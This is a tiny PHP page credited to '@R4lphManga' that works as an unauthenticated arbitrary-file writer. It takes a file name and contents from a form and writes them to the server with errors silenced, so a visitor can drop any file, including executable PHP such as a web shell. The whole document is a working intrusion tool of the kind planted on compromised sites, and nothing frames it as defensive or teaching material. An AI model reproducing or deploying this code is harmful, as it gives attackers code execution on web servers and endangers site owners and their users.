<center>
<h1><font face=courier new>Make File By @R4lphManga <br></h1>

   <form action="<?php $_SERVER['PHP_SELF']; ?>" method="post">
   NOMBRE:<input name="nombre" value="file.php"><br>CONTENIDO:<br><textarea name="contenido" cols="50" rows="20">Contenido...</textarea><br><input type="submit">

<?php
$texto = $_POST['contenido'];
    $name = $_POST['nombre'];
    $hacer = @fopen($name,'w+');
    @fwrite($hacer, $texto);
    @fclose($hacer);
    if (file_exists($name) == true) {
        print "Archivo subido correctamente";
    }
?>
